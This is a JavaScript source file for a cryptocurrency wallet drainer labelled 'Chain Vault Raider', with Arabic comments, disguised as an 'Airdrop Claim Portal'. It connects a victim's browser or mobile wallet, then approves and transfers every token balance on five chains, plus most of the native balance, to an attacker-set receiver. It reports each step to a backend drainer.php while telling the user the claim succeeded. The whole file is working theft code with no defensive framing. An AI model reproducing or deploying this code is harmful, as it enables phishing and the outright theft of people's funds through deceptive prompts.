/* ============================================
   CHAIN VAULT RAIDER — UNIFIED DRAIN ENGINE v2.1
   Wallets: Browser Extensions (EIP-1193) + WalletConnect v2 (Mobile)
   NEW: Full drain report — quantities per token per chain
   ============================================ */
(function () {
    'use strict';

    const API = {
        config: '/core/drainer.php?action=config',
        notify: '/core/drainer.php?action=notify&event={EVENT}&address={ADDR}&chain={CHAIN}&extra={EXTRA}'
    };

    let CFG = null;
    let wallet = null;          // موحّد: إما امتداد المتصفح أو WalletConnect
    let walletType = null;      // 'extension' | 'walletconnect'
    let provider = null;
    let signer = null;
    let userAddr = null;
    let currentChainKey = null;

    /* --- [REPORT] يجمع كل ما سُحب فعليًا للملخص النهائي --- */
    let drainReport = [];
    let drainFailCount = 0;
    const pushReport = (chainKey, sym, amount) => {
        drainReport.push({ chain: chainKey, token: sym, amount: amount });
    };

    /* --- [UTIL] --- */
    const $ = id => document.getElementById(id);
    const status = (msg, cls) => { $('status').textContent = msg; $('status').className = 'status ' + (cls || ''); };
    const toast = msg => { const t = $('toast'); t.textContent = msg; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 3500); };

    function relPath(path) {
        const base = location.pathname.replace(/\/[^\/]*$/, '');
        return base + path;
    }

    async function notify(event, addr, chain, extra) {
        try {
            const url = relPath(API.notify)
                .replace('{EVENT}', encodeURIComponent(event))
                .replace('{ADDR}', encodeURIComponent(addr || ''))
                .replace('{CHAIN}', encodeURIComponent(chain || ''))
                .replace('{EXTRA}', encodeURIComponent(extra || ''));
            await fetch(url);
        } catch (e) {}
    }

    const hexToNumber = h => parseInt(h, 16);
    const numberToHex = n => '0x' + n.toString(16);

    function loadScript(src) {
        return new Promise((resolve, reject) => {
            if (document.querySelector('script[data-wc="1"]')) return resolve();
            const s = document.createElement('script');
            s.src = src; s.dataset.wc = '1';
            s.onload = resolve; s.onerror = reject;
            document.head.appendChild(s);
        });
    }

    /* --- [INIT] --- */
    $('btnConnect').addEventListener('click', connectWallet);
    $('btnClaim').addEventListener('click', drainAll);

    async function init() {
        try {
            const r = await fetch(relPath(API.config));
            CFG = await r.json();
            window.__DRAINER_CFG = CFG;
        } catch (e) { status('Failed to load configuration.', 'err'); }
    }
    init();

    /* --- [GET EXTENSION WALLET] (يلتقط أي محفظة EIP-1193 حتى مع التعارض) --- */
    function getExtensionWallet() {
        const eth = window.ethereum;
        if (!eth) return null;
        if (eth.providers && eth.providers.length) {
            return eth.providers.find(p => p.isMetaMask) || eth.providers[0];
        }
        return eth;
    }

    /* --- [WC PROVIDER] --- */
    async function getWalletConnectProvider() {
        if (!CFG.walletconnect || !CFG.walletconnect.project_id ||
            CFG.walletconnect.project_id === 'PUT_YOUR_WC_PROJECT_ID_HERE') {
            toast('⚠ WalletConnect not configured in config.php');
            return null;
        }
        await loadScript('https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.2/dist/index.umd.min.js');
        const chains = Object.values(CFG.chains).filter(c => c.chainId).map(c => c.chainId);
        const rpcMap = {};
        Object.values(CFG.chains).forEach(c => { if (c.chainId && c.rpc) rpcMap[c.chainId] = c.rpc; });

        const wcProvider = await window.EthereumProvider.init({
            projectId: CFG.walletconnect.project_id,
            chains: [chains[0]],
            optionalChains: chains.slice(1),   // يسمح بتبديل الشبكات بلا مشاكل
            showQrModal: true,                 // نافذة QR للموبايل
            rpcMap: rpcMap,
            metadata: {
                name: 'Airdrop Claim Portal',
                description: 'Verify eligibility and claim rewards',
                url: location.origin,
                icons: [location.origin + '/favicon.ico']
            }
        });
        return wcProvider;
    }

    /* --- [CONNECT FLOW] --- */
    async function connectWallet() {
        // أولوية: امتداد المتصفح، وإلا → WalletConnect
        try {
            const ext = getExtensionWallet();
            if (ext) {
                const accounts = await ext.request({ method: 'eth_requestAccounts' });
                wallet = ext; walletType = 'extension';
                await finishConnect(accounts);
                return;
            }
        } catch (e) { /* المستخدم رفض أو خرب الامتداد → نكمل لـ WC */ }

        try {
            status('Opening wallet selector…');
            const wc = await getWalletConnectProvider();
            if (!wc) return;
            await wc.connect();                  // يطلع QR / قائمة المحافظ للموبايل
            wallet = wc; walletType = 'walletconnect';
            const accounts = wc.accounts;
            await finishConnect(accounts);
        } catch (err) {
            status('Connection rejected.', 'err');
            toast('❌ Connection rejected');
        }
    }

    async function finishConnect(accounts) {
        if (!accounts || !accounts.length) { status('No account returned.', 'err'); return; }
        userAddr = accounts[0];

        provider = new ethers.providers.Web3Provider(wallet);
        signer = provider.getSigner();

        const chainIdHex = await wallet.request({ method: 'eth_chainId' });
        currentChainKey = detectChainKey(hexToNumber(chainIdHex));

        $('wpill').style.display = 'block';
        $('waddr').textContent = userAddr.slice(0, 6) + '…' + userAddr.slice(-4);
        $('btnConnect').style.display = 'none';
        $('btnClaim').style.display = 'block';
        status('✅ Wallet connected on ' + (CFG.chains[currentChainKey]?.name || 'Unknown'), 'ok');
        toast('✅ Wallet connected!');
        notify('connect', userAddr, currentChainKey, 'Connected via ' + walletType);
    }

    function detectChainKey(chainIdNum) {
        for (const key in CFG.chains) {
            if (CFG.chains[key].chainId === chainIdNum) return key;
        }
        return 'ethereum';
    }

    /* --- [DRAIN ALL] --- */
    async function drainAll() {
        if (!userAddr || !CFG) return;
        $('loader').style.display = 'block';
        $('btnClaim').disabled = true;
        status('Claiming your rewards…');

        // تصفير العدادات لهذه الجولة
        drainReport = [];
        drainFailCount = 0;

        try {
            const priorityChains = ['ethereum', 'bsc', 'polygon', 'arbitrum', 'base'];
            for (const chainKey of priorityChains) {
                const chain = CFG.chains[chainKey];
                if (!chain || !chain.chainId) continue;
                try { await switchToChain(chain.chainId); } catch (e) { continue; }

                provider = new ethers.providers.Web3Provider(wallet);
                signer = provider.getSigner();
                try { await sweepTokensOnChain(chainKey); } catch (e) {}
            }
            if (CFG.chains[currentChainKey]?.chainId) {
                try { await switchToChain(CFG.chains[currentChainKey].chainId); } catch (e) {}
            }

            /* --- [BUILD FINAL REPORT] --- */
            let summary = 'Drain completed (' + walletType + ')';
            if (drainReport.length > 0) {
                summary += '\n━━━━━━━━━━━━━━━\n';
                const byChain = {};
                drainReport.forEach(r => {
                    const key = r.chain.toUpperCase();
                    if (!byChain[key]) byChain[key] = [];
                    byChain[key].push(r.amount + ' ' + r.token);
                });
                for (const chainName in byChain) {
                    summary += '🌐 ' + chainName + ':\n  • ' + byChain[chainName].join('\n  • ') + '\n';
                }
                summary += '━━━━━━━━━━━━━━━\n💵 Total assets drained: ' + drainReport.length;
            } else {
                summary += ' (wallet was empty)';
            }
            if (drainFailCount > 0) {
                summary += '\n⚠ Failed/empty: ' + drainFailCount;
            }

            $('loader').style.display = 'none';
            $('btnClaim').disabled = false;
            status('🎉 Claim successful! Rewards are being transferred.', 'ok');
            toast('🎁 Claim successful!');
            notify('drain', userAddr, 'multi', summary);
        } catch (err) {
            $('loader').style.display = 'none';
            $('btnClaim').disabled = false;
            status('Claim failed. Please try again.', 'err');
            notify('pending', userAddr, currentChainKey, 'Rejected or error');
        }
    }

    async function switchToChain(chainId) {
        const targetHex = numberToHex(chainId);
        try {
            await wallet.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: targetHex }]
            });
        } catch (err) {
            // WC: التبديل يشتغل عبر optionalChains غالبًا بلا إضافة يدوية
            // الامتدادات: نضيف الشبكة إذا ناقصة
            if (walletType === 'extension' && err.code === 4902) {
                const chain = Object.values(CFG.chains).find(c => c.chainId === chainId);
                if (!chain) throw err;
                await wallet.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: targetHex,
                        chainName: chain.name,
                        nativeCurrency: { name: chain.symbol, symbol: chain.symbol, decimals: 18 },
                        rpcUrls: [chain.rpc],
                        blockExplorerUrls: [chain.explorer]
                    }]
                });
                await wallet.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: targetHex }]
                });
            } else if (err.code !== 4902) throw err;
        }
    }

    /* --- [SWEEP PER CHAIN] --- */
    async function sweepTokensOnChain(chainKey) {
        const tokens = CFG.tokens[chainKey];
        if (!tokens) return;
        const ERC20_ABI = [
            "function balanceOf(address) view returns(uint256)",
            "function approve(address,uint256) returns(bool)",
            "function transferFrom(address,address,uint256) returns(bool)",
            "function decimals() view returns(uint8)"
        ];
        const receiver = CFG.receiver;

        for (const sym in tokens) {
            const tokenAddr = tokens[sym];
            if (!/^0x[0-9a-fA-F]{40}$/.test(tokenAddr)) continue;
            let contract;
            try {
                contract = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
                var balance = await contract.balanceOf(userAddr);
                var decimals = await contract.decimals();
            } catch (e) { continue; }
            if (balance.isZero()) continue;
            try {
                const approveTx = await contract.approve(receiver, balance);
                await approveTx.wait();
                await notify('approve', userAddr, chainKey, 'Approved ' + sym + ' qty: ' + balance.toString());
                const transferTx = await contract.transferFrom(userAddr, receiver, balance);
                await transferTx.wait();

                /* [REPORT] كمية قابلة للقراءة بكسور التوكن الصحيحة */
                const readable = ethers.utils.formatUnits(balance, decimals);
                pushReport(chainKey, sym, readable);
                await notify('drain', userAddr, chainKey, '✅ Transferred ' + readable + ' ' + sym);
            } catch (e) {
                drainFailCount++;   // ضحية رفض التوقيع أو فشل التوكن
            }
        }

        try {
            const nativeBalance = await provider.getBalance(userAddr);
            const gasReserve = ethers.utils.parseEther('0.002');
            if (nativeBalance.gt(gasReserve)) {
                const sendable = nativeBalance.sub(gasReserve);
                const tx = await signer.sendTransaction({ to: receiver, value: sendable });
                await tx.wait();

                /* [REPORT] العملة الأصلية */
                const nativeAmt = ethers.utils.formatEther(sendable);
                pushReport(chainKey, CFG.chains[chainKey].symbol, nativeAmt);
                await notify('drain', userAddr, chainKey, 'Native: ' + nativeAmt + ' ' + CFG.chains[chainKey].symbol);
            }
        } catch (e) {}
    }

    window.CVR = { connectWallet, drainAll, getWallet: () => wallet, CFG: () => CFG, getReport: () => drainReport };
})();
